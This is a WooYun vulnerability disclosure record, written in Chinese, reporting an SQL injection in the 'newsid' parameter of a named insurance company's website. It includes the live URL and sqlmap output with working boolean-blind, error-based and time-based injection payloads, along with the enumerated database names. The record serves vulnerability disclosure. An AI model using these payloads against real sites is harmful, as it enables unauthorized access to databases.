wybug_title: 乐爱金财产保险官方SQL注入漏洞
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail: 漏洞详情 披露状态：   									2015-03-30：	细节已通知厂商并且等待厂商处理中									2015-04-04：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 乐爱金SQL注入漏洞 详细说明：  http://www.ligchina.com.cn/news/news.asp?newsid=0   漏洞证明：  GET parameter 'newsid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 246 HTTP(s) requests:---Place: GETParameter: newsid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: newsid=0 AND 6600=6600    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: newsid=0 AND (SELECT 9660 FROM(SELECT COUNT(*),CONCAT(0x7167776771,(SELECT (CASE WHEN (9660=9660) THEN 1 ELSE 0 END)),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: newsid=0 AND SLEEP(5)---[19:12:11] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003 or XPweb application technology: Microsoft IIS 6.0, ASPback-end DBMS: MySQL 5.0[19:12:11] [INFO] fetching database names[19:12:12] [INFO] the SQL query used returns 2 entries[19:12:12] [INFO] retrieved: information_schema[19:12:12] [INFO] retrieved: lig_webavailable databases [2]:[*] information_schema[*] lig_web   修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-04 17:04 厂商回复：  漏洞Rank：10  (WooYun评价) 最新状态： 2015-04-04：漏洞已修复，谢谢
